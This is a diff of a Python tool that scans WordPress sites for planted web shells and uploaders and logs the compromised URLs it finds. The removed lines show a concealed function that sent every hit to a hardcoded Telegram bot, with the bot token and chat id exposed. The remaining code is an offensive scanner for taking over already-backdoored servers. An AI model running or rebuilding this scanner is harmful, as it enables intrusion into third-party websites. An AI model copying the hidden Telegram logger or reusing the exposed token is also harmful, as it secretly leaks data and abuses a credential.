@@ -174,22 +174,12 @@ def Check_Backdoors(Respones,Sign):
             return NullData 
     else:
         return NullData
-        
-        
-
-import telepot
-def parimalam(url, _FirstFilePhP, _NextFilePhP):
-    chat_id = '259790855'
-    telegram_token = '5598996353:AAFxlDhZ2wSMG_fRWWI9pWxJb926BGYwryI'
-    bot = telepot.Bot(telegram_token)
-    message = "[Logger-g0tcha]\n\n[+] URLs: " + url + _FirstFilePhP + _NextFilePhP
-    bot.sendMessage(chat_id=chat_id, text=message)
 
 
 
 def Exploiter(site,Dirctorys):
     try:
-        url = "https://" + URLdomain(site)
+        url = "http://" + URLdomain(site)
 
         for Path in Dirctorys:
         
@@ -216,18 +206,15 @@ def Exploiter(site,Dirctorys):
                                 if any(Shells in Check_Backdoors(Request_Text,Shells) for Shells in Strings_Shells):
                                     print("[Wordpress]: {} {}{} [Shelled!]").format(url,fg,_FirstFilePhP)
                                     open('Results/Shells.txt','a').write(url + _FirstFilePhP + "\n")
-                                    parimalam(url, _FirstFilePhP, "")
                                     exit()
                                 elif any(ups in Check_Backdoors(Request_Text,ups) for ups in Strings_Uploads):
                                     print("[Wordpress]: {} {}{} [Uploaders!]").format(url,fg,_FirstFilePhP)
                                     open('Results/Uploaders.txt','a').write(url + _FirstFilePhP + "\n")
-                                    parimalam(url, _FirstFilePhP, "")
                                     exit()
                                 
                                 else:
                                     print("[Wordpress]: {} {}{} [Success!]").format(url,fg,_FirstFilePhP)
                                     open('Results/Success.txt','a').write(url + _FirstFilePhP + "\n")
-                                    parimalam(url, _FirstFilePhP, "")
                                     exit()
 
                             else:
@@ -250,18 +237,15 @@ def Exploiter(site,Dirctorys):
                                             if any(Shells in Check_Backdoors(Request_Text,Shells) for Shells in Strings_Shells):
                                                 print("[Wordpress]: {} {}{} [Shelled!]").format(url,fg,_NextFilePhP)
                                                 open('Results/Shells.txt','a').write(url + _NextFilePhP + "\n")
-                                                parimalam(url, _NextFilePhP, "")
                                                 exit()
                                             elif any(ups in Check_Backdoors(Request_Text,ups) for ups in Strings_Uploads):
                                                 print("[Wordpress]: {} {}{} [Uploaders!]").format(url,fg,_NextFilePhP)
                                                 open('Results/Uploaders.txt','a').write(url + _NextFilePhP + "\n")
-                                                parimalam(url, _NextFilePhP, "")
                                                 exit()
                                             
                                             else:
                                                 print("[Wordpress]: {} {}{} [Success!]").format(url,fg,_NextFilePhP)
                                                 open('Results/Success.txt','a').write(url + _NextFilePhP + "\n")
-                                                parimalam(url, _NextFilePhP, "")
                                                 exit()
                                                 
                                         else:
